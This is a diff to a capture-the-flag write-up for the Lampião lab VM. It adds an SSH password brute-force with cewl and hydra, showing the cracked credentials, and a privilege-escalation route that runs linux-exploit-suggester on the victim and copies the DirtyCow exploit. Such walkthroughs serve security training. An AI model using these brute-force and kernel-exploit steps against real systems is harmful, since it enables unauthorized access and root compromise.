@@ -46,6 +46,32 @@ MAC Address: 08:00:27:E1:ED:D5 (Oracle VirtualBox virtual NIC)
 |_http-title: Lampi\xC3\xA3o
 ```
 
+# Acces via ssh
+
+The target site has 2 usernames `tiago` and `eder`.  
+We use `cewl` to retrieve all words from target site.
+
+    $ cewl http://192.168.2.118:1898/ -w lampiao.txt
+
+With this dictionnary, we can bruteforce the ssh access:
+
+    $ hydra -t 4 -l tiago -P lampiao.txt 192.168.2.118 ssh
+
+3 mins later:
+
+```txt
+[STATUS] 43.00 tries/min, 129 tries in 00:03h, 708 to do in 00:17h, 4 active
+[22][ssh] host: 192.168.2.118   login: tiago   password: Virgulino
+1 of 1 target successfully completed, 1 valid password found
+```
+To connect:
+
+     $ ssh tiago@192.168.2.118
+
+There are an other ways to connect to the target too.
+
+# Acces via exploit Drupalggedon2
+
 The /CHANGELOG.txt show us the version of drupal 7.54
 
     $ searchsploit drupal
@@ -135,12 +161,28 @@ We remove `x86_64` and `arm` exploit.
 
 The list is again huge... after some times, the exploit `40847.cpp` has work...
 
+We can still lower the result with `linux-exploit-suggester.sh`, on the victim:
+
+    $ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+    $ chmod +x les.sh
+    $ ./les.sh
+
+The script found 17 exploits.
+
 ```txt
-Linux Kernel 2.6.22 < 3.9 | exploits/linux/local/40847.cpp
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847.cpp
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
 ```
 
 Yep, an exploit for `kernel 2.6.2 < 3.9` has work on a `kernel 4.4.0`.  
-It must be 'the message' of this vm, never give up !
+
+    $ searchsploit 40847
+    $ cp /usr/share/exploitdb/exploits/linux/local/40847.cpp ./
 
 Start a server to download file under the lampiao vm.
 
